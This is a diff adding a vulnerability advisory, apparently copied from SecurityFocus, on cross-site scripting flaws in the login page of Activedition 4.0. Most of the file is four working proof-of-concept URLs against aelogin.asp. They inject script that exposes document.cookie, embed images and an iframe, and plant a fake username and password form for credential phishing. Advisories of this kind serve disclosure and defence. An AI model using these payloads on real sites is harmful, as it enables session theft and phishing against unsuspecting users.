@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/42164/info
+
+Activedition is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Activedition 4.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/activedition/aelogin.asp?status=Fail&noreset=True&workflow='"<script><img src="x" onerror='alert(document.cookie)'&liststatus=&area=&pageid=
+
+http://www.example.com/activedition/aelogin.asp?status=Fail&noreset=True&workflow='"<script><img src="http://www.example.com/images/logo_procheckup.gif&liststatus=&area=&pageid=
+
+http://www.example.com/activedition/aelogin.asp?status=Fail&noreset=True&workflow='"<script><iframe%20src="http://www.example.com" width="600%" height="300%"&liststatus=&area=&pageid=
+
+http://www.example.com/activedition/aelogin.asp?status=&noreset=False&workflow=&liststatus=&area=&pageid='"<script><b>User Name<b><BR><input name="user"><BR><b>Password<b><BR><input type = "password" name="pass"><button onClick="">Log in</button
